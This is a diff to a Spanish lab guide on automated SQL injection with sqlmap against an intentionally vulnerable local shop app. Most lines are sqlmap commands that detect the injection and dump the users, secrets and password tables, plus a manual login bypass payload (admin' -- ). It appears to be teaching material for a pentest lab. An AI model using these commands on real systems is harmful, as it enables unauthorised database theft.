@@ -1,59 +1,42 @@
 # 03 — Explotación automatizada con SQLMap
 
-> Todos los comandos asumen la app vulnerable en `http://localhost:3000`.
-> Para el laboratorio: `--batch` (no interactivo), `--flush-session` para repetir limpio.
+> App vulnerable en `http://localhost:3000`. Usar `--batch` (no interactivo) y
+> `--flush-session` para repetir limpio.
 
-## 3.1 — Conceptos de agresividad: `--level` y `--risk`
+## 3.1 — Agresividad: `--level` y `--risk`
 
 | Opción | Rango | Qué cambia |
 |---|---|---|
-| `--level` | 1–5 | Cantidad de puntos probados (headers, cookies, etc.) y payloads. Nivel ≥2 prueba Cookie; ≥3 User-Agent/Referer. |
-| `--risk` | 1–3 | Agresividad de los payloads. 1=seguro; 2 agrega time-based pesados; 3 agrega `OR`-based (puede modificar datos). |
+| `--level` | 1–5 | Puntos probados (GET/POST, Cookie en ≥2, headers en ≥3) y cantidad de payloads |
+| `--risk` | 1–3 | Agresividad: 1 seguro; 2 agrega time-based pesados; 3 agrega `OR`-based |
 
-Estrategia recomendada: empezar con `--level 1 --risk 1` e ir subiendo solo si no detecta.
+Estrategia: empezar en `--level 1 --risk 1` y subir si no detecta.
 
 ## 3.2 — Técnicas (`--technique`)
-`B`=Boolean blind, `E`=Error-based, `U`=Union, `S`=Stacked, `T`=Time-based, `Q`=inline.
-Por defecto SQLMap prueba `BEUSTQ`. Para aislar una técnica concreta usar `--technique=`.
+`B`=Boolean blind, `E`=Error-based, `U`=Union, `S`=Stacked, `T`=Time-based.
+Por defecto prueba `BEUSTQ`. Para aislar una: `--technique=U`.
 
 ---
 
-## 3.3 — Endpoint 1: Búsqueda (UNION / Error / Boolean) — GET
+## 3.3 — Vulnerabilidad 2: Buscador (GET `q`)
 
 ### Detección
 ```
 sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch
 ```
-### Forzar UNION y volcar
+### Volcado (UNION / extracción de datos)
 ```
-sqlmap -u "http://localhost:3000/?q=teclado" -p q --technique=U --batch --dbs
+sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch --dbs
 sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch -D shopdb --tables
-sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch -D shopdb -T users --dump
+sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch -D shopdb -T users   --dump
 sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch -D shopdb -T secrets --dump
 ```
 
 ---
 
-## 3.4 — Endpoint 2: Detalle por id (Error-based / Boolean) — GET en path
-El parámetro está en la **ruta**; se marca con `*`:
-```
-sqlmap -u "http://localhost:3000/products/1*" --batch --technique=E --dbs
-sqlmap -u "http://localhost:3000/products/1*" --batch --technique=B -D shopdb -T users --dump
-```
+## 3.4 — Vulnerabilidad 1: Login (POST)
 
----
-
-## 3.5 — Endpoint 3: API (Time-based blind) — GET
-```
-sqlmap -u "http://localhost:3000/api/products?minStock=1" -p minStock \
-       --technique=T --batch --current-user --current-db
-```
-
----
-
-## 3.6 — Endpoint 4: Login (POST) — formulario
-
-### Opción A: indicar los datos POST
+### Opción A: datos POST en línea
 ```
 sqlmap -u "http://localhost:3000/login" \
        --data="username=admin&password=x" -p username \
@@ -61,27 +44,34 @@ sqlmap -u "http://localhost:3000/login" \
 ```
 ### Opción B: request guardado de Burp (recomendado)
 1. En Burp: *Save item* → `login.req`.
-2. `sqlmap -r login.req -p username --batch --dump -D shopdb -T users`
+2. `sqlmap -r login.req -p username --batch -D shopdb -T users --dump`
+
+> El login también permite el *bypass* manual (`admin' -- `); SQLMap sirve para
+> confirmar la inyección y enumerar/volcar a partir de ese punto.
 
 ---
 
-## 3.7 — Enumeración completa (una corrida "a fondo")
+## 3.5 — Reconocimiento de privilegios (para el capítulo de impacto)
 ```
 sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch \
-       --level 5 --risk 3 \
        --banner --current-user --current-db --is-dba \
-       --users --passwords --privileges \
-       --dbs
+       --users --passwords --privileges
 ```
-- `--is-dba` → indica si el usuario de BD es administrador (en `app-vuln`: **True**).
-- `--privileges` → lista privilegios (debería mostrar `FILE`).
+- `--is-dba` → en `app-vuln` devuelve **True**.
+- `--privileges` → muestra `FILE` (habilita lectura/escritura de archivos; ver cap. 04).
 
 ---
 
-## 3.8 — Buenas prácticas de la corrida
+## 3.6 — Enumeración completa (una corrida "a fondo")
+```
+sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch \
+       --level 5 --risk 3 --threads 4 \
+       --dbs --output-dir=./evidencias/sqlmap
+```
+
+## 3.7 — Buenas prácticas
 - `--batch` para repetibilidad; `--flush-session` para empezar de cero.
-- `--threads 4` acelera blind; `--delay`/`--time-sec` ajustan time-based.
-- Guardar salida: `--output-dir=./evidencias/sqlmap`.
-- Documentar en `evidencias/` la salida de cada técnica (U/E/B/T) por separado.
+- `--threads 4` acelera; `--delay`/`--time-sec` ajustan técnicas blind.
+- Documentar la salida de cada técnica en `evidencias/`.
 
 El impacto (volcado completo, archivos, os-shell) se desarrolla en `04-impacto.md`.
